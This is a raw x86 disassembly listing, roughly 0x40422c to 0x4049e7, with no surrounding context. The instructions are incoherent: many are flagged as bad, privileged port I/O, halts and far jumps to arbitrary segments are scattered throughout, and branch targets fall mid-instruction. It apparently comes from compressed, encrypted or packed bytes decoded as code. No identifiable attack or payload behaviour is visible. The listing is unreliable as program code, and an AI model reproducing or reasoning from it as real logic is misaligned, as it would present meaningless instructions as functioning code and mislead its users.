  40422c:	out    dx,eax
  40422d:	mov    edx,0x8844e82
  404232:	jae    0x4041bc
  404234:	pop    esi
  404235:	aad    0x96
  404237:	imul   edx,DWORD PTR [ebp-0x11],0x445d7364
  40423e:	test   ebp,esi
  404240:	sbb    al,0xa
  404242:	fadd   st(3),st
  404244:	loop   0x404202
  404246:	test   BYTE PTR [eax+0x3f1cc531],dl
  40424c:	jo     0x404247
  40424e:	not    DWORD PTR [esi+0x7298cc68]
  404254:	imul   edx,DWORD PTR [esp+ebp*1],0xfffffffb
  404258:	jecxz  0x404268
  40425a:	adc    edx,DWORD PTR [esi+ecx*2+0x7f]
  40425e:	push   ss
  40425f:	hlt    
  404260:	jmp    0x404264
  404262:	fild   WORD PTR [esi]
  404264:	pop    edi
  404265:	shr    BYTE PTR [edi-0x1cb50117],0x10
  40426c:	inc    ebp
  40426d:	sub    dl,dl
  40426f:	cli    
  404270:	in     al,dx
  404271:	clc    
  404272:	mov    al,0x35
  404274:	push   ecx
  404275:	mov    ecx,0xb50c877b
  40427a:	rcr    DWORD PTR [ecx+0x4e],cl
  40427d:	out    dx,eax
  40427e:	jae    0x40424e
  404280:	push   ss
  404281:	inc    ebp
  404282:	adc    al,0xf3
  404284:	pop    ecx
  404285:	xchg   esp,eax
  404286:	sub    DWORD PTR [esp+eax*2-0x5f],eax
  40428a:	aad    0x1c
  40428c:	xor    al,0x17
  40428e:	mov    eax,0x602cc1b4
  404293:	in     al,dx
  404294:	aad    0xd3
  404296:	or     BYTE PTR [edi+0x7cb1df8b],dl
  40429c:	test   eax,0x12c6a53
  4042a1:	cmc    
  4042a2:	or     DWORD PTR [ebx],esi
  4042a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042a5:	add    al,0x81
  4042a7:	adc    dl,BYTE PTR [eax-0x3cc762ea]
  4042ad:	push   cs
  4042ae:	inc    ebp
  4042af:	push   ebx
  4042b0:	(bad)  [edx-0x7dc2af6d]
  4042b6:	retf   0x97a1
  4042b9:	hlt    
  4042ba:	adc    dh,BYTE PTR [ebx]
  4042bc:	aaa    
  4042bd:	sbb    edi,ebp
  4042bf:	xor    eax,ebp
  4042c1:	xchg   ebp,eax
  4042c2:	enter  0xe70d,0x6e
  4042c6:	jno    0x40424e
  4042c8:	dec    ebp
  4042c9:	cwde   
  4042ca:	xor    ebp,DWORD PTR [edi+0x78]
  4042cd:	dec    esp
  4042ce:	or     eax,0x72bd4604
  4042d3:	sub    eax,edi
  4042d5:	sub    eax,0xd33bb8df
  4042da:	aaa    
  4042db:	jmp    0xf8b0e769
  4042e0:	sahf   
  4042e1:	lods   eax,DWORD PTR ds:[esi]
  4042e2:	cwde   
  4042e3:	mov    edx,0x7feea97c
  4042e8:	pop    edi
  4042e9:	inc    eax
  4042ea:	nop
  4042eb:	dec    esp
  4042ec:	fstp   DWORD PTR [esi+edx*1]
  4042ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042f0:	mov    edi,0x1a770417
  4042f5:	add    al,0x6a
  4042f7:	outs   dx,DWORD PTR ds:[esi]
  4042f8:	cwde   
  4042f9:	sbb    BYTE PTR [edx+ebx*8-0x66],ch
  4042fd:	jno    0x404368
  4042ff:	fwait
  404300:	jmp    0x9255e2ff
  404305:	sbb    ebp,DWORD PTR [esi]
  404307:	pop    ebp
  404308:	ja     0x404352
  40430a:	mov    esi,0x7949cfb6
  40430f:	push   0xffffff9d
  404311:	sti    
  404312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404313:	mov    DWORD PTR [ecx*8-0x605be990],eax
  40431a:	jmp    0x404313
  40431c:	dec    eax
  40431d:	sbb    DWORD PTR [ebx],0x4109a218
  404323:	jb     0x4042ad
  404325:	mov    ebx,0xfe3a2289
  40432a:	mov    eax,DWORD PTR [edx+0x3f]
  40432d:	mov    bl,0x11
  40432f:	or     DWORD PTR [edx+edi*2+0x72],0x5f
  404334:	outs   dx,DWORD PTR ds:[esi]
  404335:	pushf  
  404336:	xor    ebp,DWORD PTR [ecx+0x6ea8fd7e]
  40433c:	in     al,0xa2
  40433e:	jmp    0x4308:0xad45b38f
  404345:	fistp  QWORD PTR [ebx-0x7ce28640]
  40434b:	rol    DWORD PTR [eax],1
  40434d:	jbe    0x40432b
  40434f:	mov    ds:0xa4208ce7,eax
  404354:	dec    ecx
  404355:	pop    es
  404356:	mov    dl,0x2a
  404358:	add    eax,0x52b054a4
  40435d:	add    al,0xd
  40435f:	daa    
  404360:	adc    BYTE PTR [edi+0x46d5bbe0],bl
  404366:	aad    0xf6
  404368:	aas    
  404369:	cmp    bh,ch
  40436b:	xchg   edi,eax
  40436c:	xchg   ebp,eax
  40436d:	test   ch,dl
  40436f:	mov    bl,0xc7
  404371:	mov    bl,dh
  404373:	mov    BYTE PTR [esi-0x342709c5],dl
  404379:	sub    esp,DWORD PTR [edx-0x70677af9]
  40437f:	jmp    0x33e3:0x7a1fa8c7
  404386:	jl     0x40436e
  404388:	pop    ebp
  404389:	push   cs
  40438a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40438b:	loopne 0x404314
  40438d:	(bad)  
  40438e:	(bad)  [edx]
  404390:	sub    al,0x56
  404392:	in     eax,0x4c
  404394:	sar    DWORD PTR [esi],0x84
  404397:	jae    0x4043fd
  404399:	test   al,0xb5
  40439b:	xchg   ecx,eax
  40439c:	in     eax,dx
  40439d:	dec    edx
  40439e:	xor    cl,al
  4043a0:	test   DWORD PTR ds:0x6a36c089,ebx
  4043a6:	xchg   esi,ebp
  4043a8:	push   cs
  4043a9:	mov    WORD PTR [edx-0x30],cs
  4043ac:	add    ebp,DWORD PTR [edx]
  4043ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043af:	test   al,0x33
  4043b1:	addr16 xor al,0x7b
  4043b4:	push   edx
  4043b5:	add    BYTE PTR [edx+0x5115f4df],0x9f
  4043bc:	out    dx,al
  4043bd:	inc    esi
  4043be:	and    DWORD PTR [edi+0x73e2c688],eax
  4043c4:	add    dh,BYTE PTR [edx+0x2c9ecc86]
  4043ca:	sub    bl,BYTE PTR [ecx-0x36]
  4043cd:	loopne 0x404368
  4043cf:	add    esp,esp
  4043d1:	repz and ah,0xf1
  4043d5:	loop   0x404361
  4043d7:	ret    0x1ce6
  4043da:	jecxz  0x4043b1
  4043dc:	lds    ebx,FWORD PTR [edx]
  4043de:	jle    0x404439
  4043e0:	sbb    DWORD PTR [edx],0xfffffffa
  4043e3:	mov    ch,0xb0
  4043e6:	stc    
  4043e7:	fiadd  WORD PTR [eax+0x6da67699]
  4043ed:	mov    eax,gs:0x37d4d6a5
  4043f3:	xchg   esi,eax
  4043f4:	xchg   edx,eax
  4043f5:	ret    
  4043f6:	xor    esi,DWORD PTR [eax-0x5f324431]
  4043fc:	or     ebx,DWORD PTR [edi]
  4043fe:	jle    0x40438d
  404400:	xor    al,0xbf
  404402:	pop    esi
  404403:	mov    BYTE PTR [eax],dl
  404405:	jne    0x40440e
  404407:	int    0x65
  404409:	dec    ebx
  40440a:	jle    0x4043a5
  40440c:	outs   dx,DWORD PTR ds:[esi]
  40440d:	js     0x4043a1
  40440f:	popf   
  404410:	int3   
  404411:	inc    esp
  404412:	(bad)  
  404414:	mov    ds:0x5a73f927,al
  404419:	shl    DWORD PTR [eax-0x2fae8341],0x1c
  404420:	ja     0x40442f
  404422:	push   eax
  404423:	pop    ss
  404424:	aas    
  404425:	bound  esi,QWORD PTR [edi+0x4e]
  404428:	retf   
  404429:	xor    DWORD PTR cs:[ebp+0x57],esp
  40442d:	fsubr  st,st(1)
  40442f:	nop
  404430:	aas    
  404431:	stos   BYTE PTR es:[edi],al
  404432:	arpl   WORD PTR [esi+0x7f],bx
  404435:	push   ecx
  404436:	add    ecx,DWORD PTR [edx]
  404438:	ins    BYTE PTR es:[edi],dx
  404439:	scas   al,BYTE PTR es:[edi]
  40443a:	aaa    
  40443b:	les    ecx,FWORD PTR ds:0x6c8e53b
  404441:	add    eax,0x7b895322
  404446:	mov    ch,0x10
  404448:	jbe    0x40445b
  40444a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40444b:	push   eax
  40444c:	sti    
  40444d:	mov    bl,0x45
  40444f:	mov    bl,0x9
  404451:	inc    ebp
  404452:	push   edi
  404453:	call   0x296:0x288f16cf
  40445a:	popa   
  40445b:	mov    BYTE PTR [ebx+0x761cac97],bh
  404461:	or     al,0xc
  404463:	ja     0x4043ec
  404465:	in     al,0xf3
  404467:	inc    ebx
  404468:	xchg   ecx,eax
  404469:	pop    ebp
  40446a:	mov    al,0x81
  40446c:	pop    ecx
  40446d:	aad    0x83
  40446f:	dec    edi
  404470:	lahf   
  404471:	clc    
  404472:	sub    DWORD PTR [eax],0x3723635e
  404478:	retf   0x6a14
  40447b:	inc    edi
  40447c:	(bad)  
  40447e:	jne    0x40446b
  404480:	and    edi,DWORD PTR [ebx-0x48]
  404483:	ins    DWORD PTR es:[edi],dx
  404484:	jecxz  0x404498
  404486:	mov    ds:0xd6f7346a,eax
  40448b:	xor    edi,ecx
  40448d:	add    dh,dl
  40448f:	push   ss
  404490:	test   DWORD PTR [eax],esi
  404492:	popf   
  404493:	popf   
  404494:	imul   ebp,DWORD PTR [eax-0x16],0xbf81a67d
  40449b:	dec    edi
  40449c:	outs   dx,BYTE PTR ds:[esi]
  40449d:	adc    al,0xbe
  40449f:	(bad)
  4044a2:	or     bh,ch
  4044a4:	retf   0xfa7d
  4044a7:	adc    esi,DWORD PTR [ecx-0x5cc236f9]
  4044ad:	in     eax,0xb0
  4044af:	xchg   esp,eax
  4044b0:	scas   al,BYTE PTR es:[edi]
  4044b1:	xchg   ebp,eax
  4044b2:	pop    ebp
  4044b3:	das    
  4044b4:	cmp    edi,edi
  4044b6:	mov    ebp,0xfd20ed12
  4044bb:	imul   cl
  4044bd:	add    dh,bl
  4044bf:	test   DWORD PTR [edi+ebx*1+0x4b],eax
  4044c3:	mov    cl,0xcd
  4044c5:	sbb    eax,0x395aac42
  4044ca:	sub    al,0x0
  4044cc:	je     0x4044b7
  4044ce:	xchg   edi,eax
  4044cf:	dec    esp
  4044d0:	arpl   cx,cx
  4044d2:	outs   dx,DWORD PTR ds:[esi]
  4044d3:	or     al,0x77
  4044d5:	dec    esp
  4044d6:	push   ecx
  4044d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044d8:	jp     0x40453f
  4044da:	scas   al,BYTE PTR es:[edi]
  4044db:	int    0xa4
  4044dd:	sbb    DWORD PTR [ebp+0x43],ecx
  4044e0:	mov    ds:0xc9c72ead,al
  4044e5:	pop    ds
  4044e6:	inc    edx
  4044e7:	pop    esp
  4044e8:	jne    0x404500
  4044ea:	inc    esp
  4044eb:	mov    edi,DWORD PTR [ebp-0x78]
  4044ee:	dec    esi
  4044ef:	xchg   BYTE PTR [edi-0x65],bh
  4044f2:	xor    al,0xa9
  4044f4:	repnz mov cl,ch
  4044f7:	ss jo  0x404561
  4044fa:	clc    
  4044fb:	mov    eax,ds:0xd712a786
  404500:	jmp    0x40453a
  404502:	adc    DWORD PTR [esi],edx
  404504:	(bad)  
  404505:	jae    0x4044fe
  404507:	pop    ecx
  404508:	xor    eax,0xba8c9213
  40450d:	inc    ecx
  40450e:	inc    BYTE PTR es:[edi+0x5e7e3a20]
  404515:	mov    BYTE PTR [ebp-0x54],bh
  404518:	adc    eax,0x71e3e090
  40451d:	and    al,0x7e
  40451f:	push   ecx
  404520:	jmp    0x40454d
  404522:	pop    ds
  404523:	and    ch,BYTE PTR [edx+0x71]
  404526:	repnz ins BYTE PTR es:[edi],dx
  404528:	out    0x19,al
  40452a:	or     BYTE PTR ds:0xc6f25099,dl
  404530:	fisttp WORD PTR [ecx]
  404532:	fwait
  404533:	dec    ecx
  404534:	mov    DWORD PTR [ebx-0x121deb7a],esp
  40453a:	test   cl,bh
  40453c:	push   0x9c818f9d
  404541:	loop   0x404544
  404543:	adc    ebx,DWORD PTR [ecx+ebp*8]
  404546:	aad    0xac
  404548:	test   eax,0x7561e528
  40454d:	mov    DWORD PTR [ebx-0x1f5749cb],eax
  404553:	xor    al,0xde
  404555:	loope  0x40454a
  404557:	dec    eax
  404558:	retf   0x7b05
  40455b:	mov    ds:0xff641da8,al
  404560:	push   ebx
  404561:	pop    ebp
  404562:	xor    ch,BYTE PTR [edi+0x4b]
  404565:	dec    ecx
  404566:	ins    BYTE PTR es:[edi],dx
  404567:	int3   
  404568:	push   edx
  404569:	fistp  QWORD PTR [edi+0x72]
  40456c:	push   0xde121ec4
  404571:	jmp    0xb717:0xd07b455b
  404578:	cld    
  404579:	mov    al,0xea
  40457b:	jne    0x4045b3
  40457d:	adc    eax,0x85b481f
  404582:	push   ss
  404583:	sbb    ah,BYTE PTR [esi+eiz*2+0x39963b71]
  40458a:	or     al,0xb9
  40458c:	cmp    edi,0x38
  40458f:	jbe    0x4045e7
  404591:	sbb    BYTE PTR [edi],ch
  404593:	dec    edx
  404594:	push   0x419eed33
  404599:	cmpps  xmm6,XMMWORD PTR fs:[edi+0x43],0x39
  40459f:	sbb    eax,0x5d76b3fe
  4045a4:	clc    
  4045a5:	mov    ch,0x58
  4045a7:	jmp    0x78cf:0x42f29c17
  4045ae:	or     bh,BYTE PTR [esi]
  4045b0:	(bad)  
  4045b1:	jmp    0xfa27:0xedc8d4a2
  4045b8:	adc    ebp,eax
  4045ba:	pop    ecx
  4045bb:	lods   al,BYTE PTR ds:[esi]
  4045bc:	mov    esi,DWORD PTR [ebx]
  4045be:	xor    BYTE PTR [ebx+0x50],dl
  4045c1:	inc    esi
  4045c2:	dec    ecx
  4045c3:	jge    0x404578
  4045c5:	mov    ebx,0xaad0ba6c
  4045ca:	retf   0x7675
  4045cd:	js     0x404569
  4045cf:	imul   esi,edx,0xffffffec
  4045d2:	out    dx,eax
  4045d3:	fnstenv [ebp+0x4f]
  4045d6:	jecxz  0x4045ce
  4045d8:	outs   dx,BYTE PTR ds:[esi]
  4045d9:	clc    
  4045da:	jne    0x404622
  4045dc:	push   esp
  4045dd:	aad    0xfb
  4045df:	dec    esi
  4045e0:	stc    
  4045e1:	clc    
  4045e2:	pop    ds
  4045e3:	dec    eax
  4045e4:	xor    ah,bh
  4045e6:	mov    dl,BYTE PTR [esi]
  4045e8:	and    ecx,DWORD PTR [edx+ecx*2]
  4045eb:	test   eax,0x73cf0e22
  4045f0:	xchg   ebx,eax
  4045f1:	ins    DWORD PTR es:[edi],dx
  4045f2:	icebp  
  4045f3:	or     BYTE PTR [edi],ch
  4045f5:	mov    edi,0xd34484a0
  4045fa:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4045fc:	out    dx,al
  4045fd:	out    0x3f,al
  4045ff:	cmp    al,0xe0
  404601:	and    al,0x7f
  404604:	jno    0x4045a1
  404606:	test   DWORD PTR [edx],edi
  404608:	sub    al,bh
  40460a:	push   0xffffffaf
  40460c:	cmp    eax,DWORD PTR [ebx+0x60]
  40460f:	out    0xde,al
  404611:	inc    ebp
  404612:	inc    esp
  404613:	dec    esp
  404614:	inc    esi
  404615:	nop
  404616:	ins    BYTE PTR es:[edi],dx
  404617:	dec    ebx
  404618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404619:	and    BYTE PTR [eax+0x6d],ch
  40461c:	sub    ebx,DWORD PTR [edi]
  40461e:	pop    edi
  40461f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404620:	sub    eax,0x8a2655e1
  404625:	adc    al,0xe8
  404627:	pop    es
  404628:	xchg   ebx,eax
  404629:	xor    eax,DWORD PTR [esi+0x7e]
  40462c:	call   0xe797ec08
  404631:	pushf  
  404632:	jmp    DWORD PTR [ebp+0x32fb987a]
  404638:	ror    DWORD PTR [esi+eiz*8],0x97
  40463c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40463d:	in     al,dx
  40463e:	push   ebp
  40463f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404640:	cli    
  404641:	mov    ds:0xcd68d15f,al
  404646:	jns    0x40468d
  404648:	xchg   esp,ebx
  40464a:	sbb    DWORD PTR [edi],0x6090236
  404650:	(bad)  
  404651:	sub    eax,0x7a1c7a0f
  404656:	adc    BYTE PTR [ecx],dl
  404658:	push   0x7d
  40465a:	out    dx,al
  40465b:	adc    bl,BYTE PTR [eax-0x7ed2b899]
  404661:	and    esp,DWORD PTR [esi+0x77]
  404664:	mov    ?,WORD PTR [ebp-0x53f1c5b5]
  40466a:	sti    
  40466b:	mov    edx,0x594fabcb
  404670:	mov    eax,0xc556bc85
  404675:	sti    
  404676:	out    0xbe,al
  404678:	xchg   edx,eax
  404679:	shl    BYTE PTR [edx+eiz*2],0x7d
  40467d:	js     0x4046a1
  40467f:	dec    esi
  404680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404681:	ja     0x4046ce
  404683:	mov    eax,ds:0x57c92806
  404688:	cmp    eax,0x9b13c3c1
  40468d:	test   eax,0xe7311daa
  404692:	xchg   ecx,eax
  404693:	cwde   
  404694:	daa    
  404695:	adc    eax,0x4f0f1d3e
  40469a:	mov    dh,0xc6
  40469c:	std    
  40469d:	jnp    0x40470c
  40469f:	jp     0x404691
  4046a1:	clc    
  4046a2:	inc    esi
  4046a3:	addr16 cdq 
  4046a5:	nop
  4046a6:	mov    ?,ebx
  4046a8:	leave  
  4046a9:	add    DWORD PTR [edi+0x2e],esp
  4046ac:	jg     0x40470a
  4046ae:	mov    ds:0x184a96db,al
  4046b3:	(bad)  
  4046b5:	nop
  4046b6:	mov    ah,0x2a
  4046b8:	jge    0x4046e2
  4046ba:	jo     0x4046bf
  4046bc:	loop   0x4046da
  4046be:	push   ebx
  4046bf:	mov    ah,0x11
  4046c1:	xchg   edx,eax
  4046c2:	aam    0xf9
  4046c4:	or     esp,DWORD PTR [esi+0x75]
  4046c7:	sbb    BYTE PTR [ebp+0x30],cl
  4046ca:	sahf   
  4046cb:	or     dh,0xe1
  4046ce:	adc    DWORD PTR [ecx+0x21c0b49a],ecx
  4046d4:	push   ebx
  4046d5:	shl    DWORD PTR [eax-0x3a],cl
  4046d8:	xor    al,0xc6
  4046da:	imul   ebx,DWORD PTR ds:0x52334d75,0x55
  4046e1:	pop    edi
  4046e2:	dec    esp
  4046e3:	repz in eax,dx
  4046e5:	pusha  
  4046e6:	or     ch,cl
  4046e8:	add    dl,BYTE PTR [esi-0x16ce93a6]
  4046ee:	sbb    ebp,DWORD PTR [edx+ebx*4-0x42523405]
  4046f5:	inc    edi
  4046f6:	xchg   BYTE PTR ds:0xcbc64450,dh
  4046fc:	push   ecx
  4046fd:	sbb    al,0x45
  4046ff:	dec    edi
  404700:	mov    bl,0xef
  404702:	xor    eax,0x8f7a689f
  404707:	mov    dh,0xf8
  404709:	jge    0x40474d
  40470b:	push   ecx
  40470c:	shr    DWORD PTR [esi],0x39
  40470f:	shl    BYTE PTR [eax-0x66b1a7af],1
  404715:	jb     0x404708
  404717:	lods   al,BYTE PTR ds:[esi]
  404718:	jne    0x4046dd
  40471a:	dec    eax
  40471b:	mov    DWORD PTR [edx],esp
  40471d:	add    eax,0x78df0a55
  404722:	enter  0xd1fa,0x60
  404726:	add    dl,cl
  404728:	mov    esp,0x37a39b2b
  40472d:	cmp    BYTE PTR [esp+edi*8],ch
  404730:	and    edi,ebx
  404732:	push   ss
  404733:	mov    ecx,0xac8847b2
  404738:	xchg   edi,eax
  404739:	sbb    ah,0xbf
  40473c:	stos   DWORD PTR es:[edi],eax
  40473d:	bound  edx,QWORD PTR [ecx]
  40473f:	sbb    BYTE PTR [eax-0x7b5441b0],al
  404745:	outs   dx,DWORD PTR ds:[esi]
  404746:	cmp    al,0x56
  404748:	pop    edi
  404749:	cmp    edx,DWORD PTR [edx-0x4e]
  40474c:	sbb    ebp,ebp
  40474e:	pop    es
  40474f:	or     bl,BYTE PTR [esi]
  404751:	push   ecx
  404752:	mov    eax,0x5f46a697
  404757:	lds    esi,FWORD PTR [edi-0x7c90937a]
  40475d:	and    dh,BYTE PTR [edi+0x19]
  404760:	sub    al,0x4c
  404762:	loop   0x4047a7
  404764:	ficom  WORD PTR [edx-0x52]
  404767:	mov    WORD PTR ds:0x339579d9,cs
  40476d:	fsubr  QWORD PTR [edx]
  40476f:	call   0x6e3cae9
  404774:	xchg   DWORD PTR [edx-0x3bc14cfa],ebp
  40477a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40477b:	dec    eax
  40477c:	adc    dl,BYTE PTR [ebx+0x694886c]
  404782:	fs xchg esp,ebx
  404785:	mov    bl,0xe
  404787:	or     edx,ecx
  404789:	retf   
  40478a:	mov    edx,0x552c027b
  40478f:	mov    ebp,0x8d0dda98
  404794:	mov    esp,0xed2c3096
  404799:	pop    edi
  40479a:	sbb    ch,ah
  40479c:	pop    eax
  40479d:	aaa    
  40479e:	dec    edi
  40479f:	lods   eax,DWORD PTR ds:[esi]
  4047a0:	dec    ebx
  4047a1:	cwde   
  4047a2:	data16 out 0xaa,al
  4047a5:	shl    DWORD PTR [edx],cl
  4047a7:	test   DWORD PTR [ebx-0x58],eax
  4047aa:	push   edx
  4047ab:	pop    es
  4047ac:	sub    ebx,DWORD PTR [ebx-0x2d]
  4047af:	xlat   BYTE PTR ds:[ebx]
  4047b0:	mov    ds:0xdb7c0231,al
  4047b5:	cmp    al,0x6b
  4047b7:	and    eax,0xc97ac178
  4047bc:	(bad)  [ebp+esi*2-0x54]
  4047c0:	fbld   TBYTE PTR cs:0x995ac70b
  4047c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047c8:	ret    0xe443
  4047cb:	pop    esp
  4047cc:	pop    ecx
  4047cd:	or     dl,BYTE PTR [ebp+0x43]
  4047d0:	popf   
  4047d1:	dec    ebx
  4047d2:	scas   eax,DWORD PTR es:[edi]
  4047d3:	xlat   BYTE PTR ds:[ebx]
  4047d4:	ss into 
  4047d6:	out    dx,al
  4047d7:	fidivr WORD PTR [edi+0x6f]
  4047da:	retf   
  4047db:	xor    eax,0x8a9a3e76
  4047e0:	mov    al,0xef
  4047e2:	shr    DWORD PTR [edx],1
  4047e4:	xlat   BYTE PTR ds:[ebx]
  4047e5:	mov    ebp,0x711555d
  4047ea:	push   0x904779b2
  4047ef:	retf   0x41c2
  4047f2:	mov    ds:0x7eb856ce,eax
  4047f7:	cmp    bh,BYTE PTR [ebx+0x17]
  4047fa:	inc    edi
  4047fb:	push   ebp
  4047fc:	cs adc eax,0xd390a71d
  404802:	cmp    dh,BYTE PTR [eax+0x5f3b0a8b]
  404808:	ret    
  404809:	ror    edx,cl
  40480b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40480c:	adc    BYTE PTR [ebx-0x3a],0x9e
  404810:	mov    ds,WORD PTR [edi+0xc366fbc]
  404816:	ds dec ebp
  404818:	cli    
  404819:	mov    esp,0x47c21641
  40481e:	jae    0x40486b
  404820:	adc    ecx,DWORD PTR [edi]
  404822:	pop    ebx
  404823:	pop    ecx
  404824:	iret   
  404825:	cmp    DWORD PTR [ecx],esi
  404827:	jecxz  0x4047f5
  404829:	mov    dl,0x42
  40482b:	repnz fcom st(0)
  40482e:	aad    0x2c
  404830:	loope  0x40483d
  404832:	(bad)  
  404834:	mov    DWORD PTR [esp+edi*8+0x5f],esi
  404838:	std    
  404839:	or     eax,0x10d24d4b
  40483e:	(bad)  
  40483f:	clc    
  404840:	jg     0x404888
  404842:	ret    
  404843:	jo     0x40482d
  404845:	mov    WORD PTR [ebx+0x62],ss
  404848:	and    DWORD PTR [esi],edi
  40484a:	inc    ebp
  40484b:	xchg   ecx,eax
  40484c:	inc    eax
  40484d:	cwde   
  40484e:	in     al,dx
  40484f:	cmp    al,0x21
  404851:	test   DWORD PTR [ebx-0x3b6bfc05],0xcbd5a66f
  40485b:	mov    eax,ds:0x1b63fd0c
  404860:	xchg   eax,ebp
  404862:	outs   dx,DWORD PTR ds:[esi]
  404863:	pop    edx
  404864:	jge    0x40488a
  404866:	int    0x16
  404868:	dec    ebp
  404869:	lods   al,BYTE PTR ds:[esi]
  40486a:	push   ecx
  40486b:	fst    DWORD PTR [edi]
  40486d:	das    
  40486e:	xchg   DWORD PTR [eax-0x34],esi
  404871:	loopne 0x404865
  404873:	(bad)  
  404874:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404875:	sbb    ah,ah
  404877:	push   DWORD PTR [ebp+0x41ce52b3]
  40487d:	pop    esp
  40487e:	xchg   esi,eax
  40487f:	aas    
  404880:	out    0x85,al
  404882:	cmp    al,dh
  404884:	xchg   ebx,eax
  404885:	retf   
  404886:	xor    eax,0xc6f1dc17
  40488b:	xchg   ecx,eax
  40488c:	cmp    edx,esi
  40488e:	ins    DWORD PTR es:[edi],dx
  40488f:	push   esp
  404890:	xor    eax,0x3c05e1ce
  404895:	sar    BYTE PTR [ebx+0x1965aca],0x76
  40489c:	fcomp  QWORD PTR [ebx+0x2d4750a9]
  4048a2:	in     al,dx
  4048a3:	pop    edx
  4048a4:	xchg   esp,eax
  4048a5:	jo     0x404881
  4048a7:	pop    edx
  4048a8:	jmp    0x4048a1
  4048aa:	sub    BYTE PTR [edx],dh
  4048ac:	jbe    0x40487b
  4048ae:	loope  0x404924
  4048b0:	test   eax,0xa3a03fb3
  4048b5:	sbb    edx,edi
  4048b7:	xor    dl,bl
  4048b9:	dec    ebx
  4048ba:	call   0xf0bb:0x9070576d
  4048c1:	shl    BYTE PTR ds:0x9c9154e1,1
  4048c7:	loopne 0x404891
  4048c9:	sbb    eax,DWORD PTR [ecx-0x1fac40c4]
  4048cf:	das    
  4048d0:	xchg   ebx,eax
  4048d1:	(bad)  
  4048d2:	push   ds
  4048d3:	cmp    dl,cl
  4048d5:	sbb    ebp,DWORD PTR [esi]
  4048d7:	add    al,0x21
  4048d9:	xor    esp,edx
  4048db:	lods   al,BYTE PTR ds:[esi]
  4048dc:	ret    
  4048dd:	cmp    edi,ebp
  4048df:	mov    ecx,ebp
  4048e1:	pop    esi
  4048e2:	jo     0x404896
  4048e4:	push   cs
  4048e5:	push   esp
  4048e6:	call   0x2e29c85a
  4048eb:	adc    ecx,esi
  4048ed:	imul   DWORD PTR [edi]
  4048ef:	iret   
  4048f0:	test   al,0xef
  4048f2:	fdivp  st(4),st
  4048f4:	fld    QWORD PTR [esi+eiz*4-0x35b8ae94]
  4048fb:	arpl   WORD PTR [edi-0x6a1325e5],bp
  404901:	push   esp
  404902:	push   ebx
  404903:	mov    ds:0x198c4e65,al
  404908:	cmp    al,0x72
  40490a:	adc    eax,0xdb861da6
  40490f:	mov    esp,0x62a1d994
  404914:	out    dx,eax
  404915:	stc    
  404916:	div    BYTE PTR [ecx]
  404918:	(bad)  
  404919:	lock call 0xd67a0c44
  40491f:	inc    esi
  404920:	inc    eax
  404921:	push   es
  404922:	dec    edi
  404923:	inc    edx
  404924:	loope  0x4048af
  404926:	dec    esp
  404927:	lea    ebp,[edx]
  404929:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40492a:	sbb    al,0x9e
  40492c:	jb     0x40491a
  40492e:	xchg   ebx,eax
  40492f:	and    bl,dl
  404931:	sar    DWORD PTR ds:0x2865fa97,0x76
  404938:	and    eax,0x9adab942
  40493d:	lods   al,BYTE PTR ds:[esi]
  40493e:	xchg   esp,eax
  40493f:	fld    DWORD PTR [ecx]
  404941:	push   0xffffffc7
  404943:	push   0xffffffa4
  404945:	xor    BYTE PTR [ebx],al
  404947:	pop    eax
  404948:	xor    al,0x18
  40494a:	add    eax,esp
  40494c:	shl    BYTE PTR [ecx-0x3a],0x70
  404950:	popa   
  404951:	sub    dh,BYTE PTR [ebx-0x765a8a6a]
  404957:	(bad)  [edi]
  404959:	jecxz  0x4048fa
  40495b:	cmp    DWORD PTR [ebx],edx
  40495d:	sub    ah,BYTE PTR [esi-0x773700f3]
  404963:	push   edx
  404964:	jb     0x404985
  404966:	ss out dx,al
  404968:	xchg   ebx,eax
  404969:	mov    ebp,0xa85e36a3
  40496e:	(bad)  
  40496f:	mov    al,0x87
  404971:	mov    esi,0x8f3b9f00
  404976:	and    edi,ebp
  404978:	std    
  404979:	lods   al,BYTE PTR ds:[esi]
  40497a:	int    0x59
  40497c:	nop
  40497d:	dec    esp
  40497e:	mov    BYTE PTR [edi+0x74],bl
  404981:	xlat   BYTE PTR ds:[ebx]
  404982:	jmp    0x638:0xe7c7eecc
  404989:	int    0xe8
  40498b:	jge    0x404931
  40498d:	test   al,0xa6
  40498f:	outs   dx,DWORD PTR ds:[esi]
  404990:	mov    esp,0x893a66f8
  404995:	fisub  DWORD PTR [edi-0x65ab3702]
  40499b:	mov    esi,0x1f0159ee
  4049a0:	repz ds cmc 
  4049a3:	test   eax,0xe43a9411
  4049a8:	or     eax,0xf4e9fb09
  4049ad:	add    ah,BYTE PTR [edi]
  4049af:	mov    esp,0xaa619754
  4049b4:	dec    ebp
  4049b5:	cmp    cl,ah
  4049b7:	cmp    al,0xbf
  4049b9:	jg     0x40497d
  4049bb:	ror    dl,cl
  4049bd:	mov    BYTE PTR [ecx],0x82
  4049c0:	mov    DWORD PTR [edi+0x598a7f8a],ebp
  4049c6:	mov    ds:0xb9d175f,al
  4049cb:	ins    DWORD PTR es:[edi],dx
  4049cc:	rcl    cl,cl
  4049ce:	pop    esp
  4049cf:	test   eax,0x5b5acc92
  4049d4:	or     cl,BYTE PTR [edx-0x332f631c]
  4049da:	push   es
  4049db:	es int 0xa6
  4049de:	and    eax,0x9ffb01ff
  4049e3:	mov    bl,BYTE PTR [esi+0x44]
  4049e6:	push   ebp
  4049e7:	mov    edi,0x37875583
